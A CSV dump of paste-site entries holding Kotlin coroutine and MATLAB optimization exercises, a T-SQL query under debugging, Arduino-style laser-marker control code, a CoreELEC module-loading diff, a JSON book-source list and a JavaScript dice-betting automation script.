id,title,username,language,date,content
MQBkAetZ,Weather Coroutines with Exception,Simonegaita,Kotlin,Monday 28th of August 2023 05:46:17 AM CDT,"import kotlinx.coroutines.*

fun main() {
    runBlocking {
        println(""Weather forecast"")
        println(getWeatherReport())
        println(""Have a good day!"")
    }
}

suspend fun getWeatherReport() = coroutineScope {
    val forecast = async { getForecast() }
    val temperature = async {
        try {
            getTemperature()
        } catch (e: AssertionError) {
            println(""Caught exception $e"")
            ""{ No temperature found }""
        }
    }

    ""${forecast.await()} ${temperature.await()}""
}

suspend fun getForecast(): String {
    delay(1000)
    return ""Sunny""
}

suspend fun getTemperature(): String {
    delay(500)
    throw AssertionError(""Temperature is invalid"")
    return ""30\u00b0C""
}"
YGXQD4pp,Course 5 - Solve with constraints,makispaiktis,MatLab,Monday 28th of August 2023 05:21:37 AM CDT,"clear all
close all
clc

% 1. Load the dataset
load Nutrition.mat 
food

% 2. Create the optimization problem
prob = optimproblem(""Description"",""An Optimal Breakfast"");
servings = optimvar(""servings"",16,""LowerBound"",0);
C = food.Price .* servings;
prob.Objective = sum(C);


% 3. Equality constraint
cals = servings .* food.Calories
totalCals = sum(cals)
prob.Constraints.calories = totalCals == 350

% 4. Solve the problem
[sol, optval] = solve(prob)
optServings = sol.servings
check = evaluate(totalCals, sol)

% 5. Visualize the solution and explain
bar(food.Name, optServings)
% Since we are looking for 350 calories, but as cheap as possible, then
% the output solution must have the biggest ratio calories / money
caloriesPerDollar = food.Calories ./ food.Price;
bar(food.Name, caloriesPerDollar)"
A1x3DexZ,book_list,FreedTV,JSON,Monday 28th of August 2023 05:19:21 AM CDT,"[
    {
        ""name"":""精品书源"",
        ""show"":true,
        ""type"":""book"",
        ""url"":""https://jihulab.com/aoaostar/legado/-/raw/release/cache/71e56d4f1d8f1bff61fdd3582ef7513600a9e108.json""
    }
]"
x8peqA8v,Course 4 - Constraints,makispaiktis,MatLab,Monday 28th of August 2023 05:02:29 AM CDT,"clear all
close all
clc

% 1. Load the dataset
load Nutrition.mat 
food

% 2. Create the optimization problem
prob = optimproblem(""Description"",""An Optimal Breakfast"");
servings = optimvar(""servings"", 16, ""LowerBound"", 0)
price = food.Price
C = servings .* price
prob.Objective = sum(C);
show(prob)
[sol, optval] = solve(prob)
sol.servings"
1377PaGt,Course 3 - Solve the optimization problem (fminunc is used),makispaiktis,MatLab,Monday 28th of August 2023 04:45:35 AM CDT,"clear all
close all
clc

% 1. Basics
prob = optimproblem(""Description"",""Factory Location"");
x = optimvar(""x"");
y = optimvar(""y"");
X = [5 40 70];
Y = [20 50 15];

% 2. Optimization problem
d = sqrt((x-X).^2 + (y-Y).^2);
dTotal = sum(d);
prob.Objective = dTotal;
show(prob)
initialGuess.x = 100;
initialGuess.y = 200;

% 3. Solve the problem (MATLAB automatically decides the solver - here it is 'fminunc')
[sol, optval] = solve(prob, initialGuess)
xOpt = sol.x
yOpt = sol.y
optval2 = evaluate(dTotal, sol)
vectors = evaluate(d, sol)
flag = optval == optval2

% 4. Display
plotStores
hold on
scatter(xOpt, yOpt, 'redX')
hold off



function plotStores()
	
	X = [5 40 70];
	Y = [20 50 15];
	pgon1 = nsidedpoly(5,""Center"",[X(1) Y(1)],""sidelength"",3);
	pgon2 = nsidedpoly(5,""Center"",[X(2) Y(2)],""sidelength"",3);
	pgon3 = nsidedpoly(5,""Center"",[X(3) Y(3)],""sidelength"",3);
	plot([pgon1 pgon2 pgon3])
	axis equal

end"
h4VbCgnh,Untitled,Pandaaaa906,T-SQL,Monday 28th of August 2023 04:45:13 AM CDT,"with mid_records as (
-- 加入row_number()，按prj_id分组，按raw_records.date 正序排序
    select records.*,
    row_number() over(partition by prj_id order by raw_records.date asc) prj_r  -- spoil alert: 出问题的地方
    from raw_records
), records as (
-- 加入last_date
    select mid_records.*, cast(null as datetime2) last_date
    from mid_records 
    where mid_records.prj_r = 1

union all

    select
    mid_records.*,
    case when datepart(year, last_record.date) = datepart(year, raw_records.date) and datepart(month, last_record.date) = datepart(month, raw_records.date) then last_record.last_date  -- 如果上一条是同一个月的，用上一条的last_date
    else last_record.date end last_date
    from records last_record
    join mid_records 
    on last_record.prj_id = raw_records.prj_id
    AND last_record.prj_r + 1 = raw_records.prj_r
)

select 
records.*, 
mat_summary.sum_value

from records

outter apply(
select
sum(value)
from mat 
where mat.prj_id = records.prj_id
and mat.date < last_second_of_month(records.date)  -- 取records.date当月以及之前未重复关联的mat进行汇总
and (records.last_date is null or mat.date > first_date_of_month(records.last_date))  
) mat_summary


"
cUZEfxM6,snowy fans only,coinwalk,JavaScript,Monday 28th of August 2023 04:39:06 AM CDT,"var kozster = parseFloat($('#pct_balance').val());
var gobbie = ((kozster/320).toFixed(4));
var zeggar = gobbie;
var target = 50000;
var tens = (gobbie*10);
var sevens = (gobbie*6.1);
var eights = (gobbie*7.9);
var burgzie = kozster;
var smick = ((Math.floor(kozster/tens))*tens);
var dude = ((Math.floor(kozster/tens))*tens);
var joe = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var doh = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var boggart = 0;
var bear = true;
var tuba = ((Math.floor(kozster/tens))*tens);
var razzle;
var oldDegen = 0;
var nope = 1;
 
 
function go(){
burgzie = $('#pct_balance').val();
var bog = ((burgzie-kozster).toFixed(8));
console.log(""profit:"");
console.log(bog);
if ((burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))&&(burgzie != oldDegen)&&(burgzie>tuba)){
    zeggar = zeggar*2;
    oldDegen = parseFloat(burgzie);
}
if ((burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))&&(burgzie != oldDegen)&&(burgzie<tuba)){
    zeggar = zeggar*2;
	nope = 0;
    oldDegen = parseFloat(burgzie);
}
if ((burgzie>=(tuba+(tens*nope)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 1;
    tuba = ((Math.floor(burgzie/tens))*tens);
}
if ((burgzie>=(tuba+(tens*nope)))&&(burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))){
    zeggar = gobbie*2;
    oldDegen = 0;
    nope = 1;
    tuba = ((Math.floor(burgzie/tens))*tens);
}
if ((burgzie<=(dude-(tens*10)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 1;
    dude = ((Math.floor(burgzie/tens))*tens);
}
if ((burgzie>(dude+(tens*3)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<tuba)){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 1;
    dude = ((Math.floor(burgzie/tens))*tens);
	}
if ((burgzie>=(smick+(gobbie*40)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 1;
    tuba = ((Math.floor(burgzie/tens))*tens);
    dude = ((Math.floor(burgzie/tens))*tens);
	smick = ((Math.floor(burgzie/tens))*tens);
}
if (burgzie>=target){
console.log(""snowybot rocks"");
return;
}
doh = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var milk = document.getElementById('me').firstChild.lastChild.firstChild.children[11].innerText;
if ((milk==razzle)&&(boggart>=1)&&(doh>joe)&&(!bear)){
joe = parseFloat(doh);
bear = true;
}
if ((milk!=razzle)&&(boggart>=1)&&(doh>joe)){
console.log(""hacker attack"");
console.log(""someone else played:"");
console.log(milk);
return;
}
if ((doh==joe)&&(bear)){
razzle = ((zeggar*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo').click();
boggart = boggart+1;
bear = false;
doh = 0;
}
setTimeout(() => go(), 1);
}
go();

"
zJtrT2Lm,marker,PaRat07,C++,Monday 28th of August 2023 04:32:34 AM CDT,"#include <vector>
#include <map>
#include <string>
#include <cassert>
#include ""serial.h""

class Marker {
    void write_to_marker(String message) {
        Serial.print(message + "";;"");
    }

    String read_from_marker() {
        String ans;
        bool not_end = true;
        while (not_end) {
            String buf1 = Serial.readStringUntil(';');
            ans += buf1;
            not_end = buf1.length() > 0;
        }
        return ans;
    }

    std::vector<String> separate(String to_separate, char separator) {
        std::vector<String> ans;
        String buf;
        for (char sym : to_separate) {
            if (sym == separator) {
                ans.push_back(std::move(buf));
            } else {
                buf += sym;
            }
        }
        if (buf.length() > 0) {
            ans.push_back(std::move(buf));
        }
        return ans;
    }
public:
    Marker() {
        Serial.begin(11500);
    }
    ~Marker() {
        Serial.end();
    }


    String open(String file) {
        write_to_marker(String(""OpenDoc,"") + file);
        return read_from_marker();
    }

    String set_pen_settings(int pen_id, int mark_speed, int power) {
        write_to_marker(String(""SetPen,ID"") + pen_id + "";MarkSpeed,"" + mark_speed + "";Power,"" + power);
        return read_from_marker();
    }

    String mark() {
        write_to_marker(""StartMark"");
        while (Serial.available() == 0) delay(100);
        return read_from_marker();
    }

    std::map<String, double> get_shape_pos(String primitive_name) {
        write_to_marker(String(""GetShapePos,"") + primitive_name);
        auto data = separate(read_from_marker(), ',');
        using namespace std;
        std::map<String, double> ans
                {
                        { ""x""      , data[1].toDouble() },
                        { ""y""      , data[2].toDouble() },
                        { ""height"" , data[3].toDouble() },
                        { ""width""  , data[4].toDouble() }
                };
        return ans;
    }

    String set_shape(String primitive, String content, double x = 0., double y = 0., bool pos_type = false) {
        write_to_marker(String(""SetShapeData,"") + primitive + "","" + content + "","" + x + "","" + y + "","" + pos_type);
        return read_from_marker();
    }

    String save() {
        write_to_marker(""SaveCurrentDoc"");
        return read_from_marker();
    }

    String change_content(String content) {
        String err;
        write_to_marker(""GetShapeList"");
        std::vector<String> primitives(separate(read_from_marker(), ';'));
        for (String prim : primitives) {
            auto was = get_shape_pos(prim);
            write_to_marker(String(""SetShapeData,"") + prim + "","" + content);
            err = read_from_marker();
            if (err != ""Ok"") return err;
            auto is = get_shape_pos(prim);
            double x_offset = (was[""x""] + was[""width""] / 2) - (is[""x""] + is[""width""] / 2);
            double y_offset = (was[""y""] + was[""height""] / 2) - (is[""y""] + is[""height""] / 2);
            err = set_shape(prim, """", x_offset, y_offset);
            if (err != ""Ok"") return err;
        }
        return err;
    }
};


void setup() {
    Marker m;
    assert(m.open(""test.bpd"") == ""Ok"");
    assert(m.set_pen_settings(0, 1000, 100) == ""Ok"");
    assert(m.change_content(""PaRat07"") == ""Ok"");
    assert(m.save() == ""Ok"");
    assert(m.mark() == ""Ok"");
}

void loop() {
    // put your main code here, to run repeatedly:
}
"
JU7XkaNP,Untitled,vpeter,Bash,Monday 28th of August 2023 04:28:15 AM CDT,"diff --git a/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/dovi-loader.sh b/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/dovi-loader.sh
index 1442916458..2f83d59a67 100755
--- a/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/dovi-loader.sh
+++ b/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/dovi-loader.sh
@@ -39,18 +39,25 @@ load_dovi_ne() {
     systemctl set-environment dmsetup_remove=yes
   fi
 
-  if [ -b /dev/mapper/dynpart-odm ]; then
-    mountpoint -q /android/odm  || mount -o ro /dev/mapper/dynpart-odm /android/odm
-    DOVI_KO=""/android/odm/lib/modules/dovi.ko""
-    if [ -f ${DOVI_KO} ]; then
-      modinfo ${DOVI_KO}
-
-      case $(dtname) in
-        *sei_smb_280*)
-          if check_dovi_version ${DOVI_KO} 5 4 210; then
-            insmod  ${DOVI_KO}
-          else
-            cat > /tmp/dovi.message << 'EOF'
+  local active_slot=$(fw_printenv active_slot 2>/dev/null | awk -F '=' '/active_slot=/ {print $2}')
+  [ ""${active_slot}"" = ""normal"" ] && active_slot="""" || active_slot=""_a""
+
+  if [ -b /dev/mapper/dynpart-odm${active_slot} ]; then
+    mountpoint -q /android/odm || mount -o ro /dev/mapper/dynpart-odm${active_slot} /android/odm
+
+    DOVI_KO_STORAGE=""/storage/dovi.ko""
+    DOVI_KO_ANDROID=""/android/odm/lib/modules/dovi.ko""
+    if [ -f ${DOVI_KO_ANDROID} ]; then
+      modinfo ${DOVI_KO_ANDROID}
+
+      if [ -f ${DOVI_KO_STORAGE} ]; then
+        message ""loading dovi module from ce storage partition""
+        modinfo ${DOVI_KO_STORAGE}
+        insmod ${DOVI_KO_STORAGE}
+      elif check_dovi_version ${DOVI_KO_ANDROID} 5 4 210; then
+        insmod ${DOVI_KO_ANDROID}
+      else
+        cat > /tmp/dovi.message << 'EOF'
 [TITLE]CoreELEC Dolby Vision Media Playback[/TITLE]
 [B][COLOR red]Android Dolby Vision kernel module is not compatible[/COLOR][/B]
 [COLOR red]No Dolby Vision media playback possible![/COLOR]
@@ -58,9 +65,7 @@ load_dovi_ne() {
 Please upgrade Android firmware of your device to minimum version 'v11.8.5310'.
 Dolby Vision media will be displayed in HDR instead Dolby Vision until the firmware fulfill the minimum requirements.
 EOF
-          fi
-        ;;
-      esac
+      fi
       return
     fi
   fi
diff --git a/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/tee-loader.sh b/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/tee-loader.sh
index cd9e8f1dd7..2548a2d1f7 100755
--- a/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/tee-loader.sh
+++ b/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/tee-loader.sh
@@ -68,7 +68,8 @@ run_tee_from_android() {
   message ""run tee from android start""
 
   local active_slot=$(fw_printenv active_slot 2>/dev/null | awk -F '=' '/active_slot=/ {print $2}')
-  [ ""${active_slot}"" = ""normal"" ] && active_slot=""""
+  message ""fw active slot: '${active_slot}'""
+  [ ""${active_slot}"" = ""normal"" ] && active_slot="""" || active_slot=""_a""
 
   ! ls /dev/mapper/dynpart-* &>/dev/null && dmsetup create --concise ""$(parse-android-dynparts /dev/super)""
   mountpoint -q /android/system || mount -o ro /dev/mapper/dynpart-system${active_slot} /android/system
"
pPgGDY1r,Course 2 - Define variables and objective function,makispaiktis,MatLab,Monday 28th of August 2023 04:21:37 AM CDT,"clear all
close all
clc

% 1. Basics
prob = optimproblem(""Description"",""Factory Location"");
x = optimvar(""x"");
y = optimvar(""y"");
X = [5 40 70];
Y = [20 50 15];


% 2. Objective
d = sqrt((x - X) .^ 2 + (y -Y) .^ 2)        % 1 x 3 vector containing d1, d2, d3
dTotal = sum(d)
prob.Objective = dTotal;
show(prob)

% 3. Visualize
xvec = linspace(0,75);
yvec = linspace(0,75);
[x,y] = meshgrid(xvec,yvec);
distance = sqrt((x-X(1)).^2 + (y-Y(1)).^2)+...
    sqrt((x-X(2)).^2 + (y-Y(2)).^2)+...
    sqrt((x-X(3)).^2 + (y-Y(3)).^2);
contourf(x,y,distance)
ylabel(""Y-Coordinate"")
xlabel(""X-Coordinate"")
hold on
plot(X(1), Y(1), 'redX');
hold on
plot(X(2), Y(2), 'redX');
hold on
plot(X(3), Y(3), 'redX');
hold on
colorbar"
RWVyY4bp,serial.h,PaRat07,C++,Monday 28th of August 2023 04:19:27 AM CDT,"#define BIN 2
#define OCT 8
#define DEC 10
#define HEX 16

struct String {
    String(const char[]);
    String();
    char charAt(int) const;
    bool concat(String) const;
    bool compareTo(String) const;
    char* c_str();
    bool endsWith(String) const;
    bool equals(String) const;
    bool equalsIgnoreCase(String) const;
    void getBytes(std::byte*, unsigned) const;
    int indexOf(char) const;
    int indexOf(char, int) const;
    int indexOf(String) const;
    int indexOf(String, int) const;
    int lastIndexOf(char) const;
    int lastIndexOf(char, int) const;
    int lastIndexOf(String) const;
    int lastIndexOf(String, int) const;
    int length() const;
    void remove(int);
    void remove(int, int);
    void replace(String,String);
    void reserve(int);
    void setCharAt(int,char);
    bool startsWith(String) const;
    String substring(int,int) const;
    void toCharArray(char*, int) const;
    double toDouble() const;
    int toInt() const;
    float toFloat() const;
    void toLowerCase();
    void toUpperCase();
    void trim();
    char& operator[](int);
    const char& operator[](int) const;
    String operator+(const String&) const;
    void operator+=(const String&);
    String operator+(const char[]) const;
    void operator+=(const char[]);
    String operator+(char) const;
    void operator+=(char);
    String operator+(int) const;
    void operator+=(int);
    String operator+(double) const;
    void operator+=(double);
    String operator+(float) const;
    void operator+=(float);
    bool operator==(const String&) const;
    bool operator>(const String&) const;
    bool operator>=(const String&) const;
    bool operator<(const String&) const;
    bool operator<=(const String&) const;
    bool operator!=(const String&) const;
    bool operator==(const char[]) const;
    bool operator>(const char[]) const;
    bool operator>=(const char[]) const;
    bool operator<(const char[]) const;
    bool operator<=(const char[]) const;
    bool operator!=(const char[]) const;
    char* begin();
    char* end();
    const char* begin() const;
    const char* end() const;
};



namespace {
    struct serial_t {
        operator bool();
        bool available();
        bool availableForWrite();
        void begin(int);
        void end();
        bool find(char);
        bool find(char, size_t);
        bool findUntil(char, char);
        void flush();
        float parseFloat();
        int parseInt();
        int peek();
        size_t print(int, int);
        size_t print(double, int);
        template<class T>
        size_t print(T);
        size_t println(int, int);
        size_t println(double, int);
        template<class T>
        size_t println(T);
        int read();
        template<class T>
        size_t readBytes(T*, int);
        size_t readBytesUntil(char,char,int);
        String readString();
        String readStringUntil(char);
        void setTimeout(long);
        template<class T>
        size_t write(T);
        template<class T>
        size_t write(T*, int);
        void serialEvent();
    };
}
serial_t Serial;

void delay(int);"
sHYU0y4f,Course 1 - Create an optimization problem,makispaiktis,MatLab,Monday 28th of August 2023 04:12:20 AM CDT,"clear all
close all
clc

% 1. Create an empth optimization problem
prob = optimproblem(""Description"",""Factory Location"")
show(prob)

% 2. Create optimization variables
x = optimvar(""x"")
y = optimvar(""y"")"
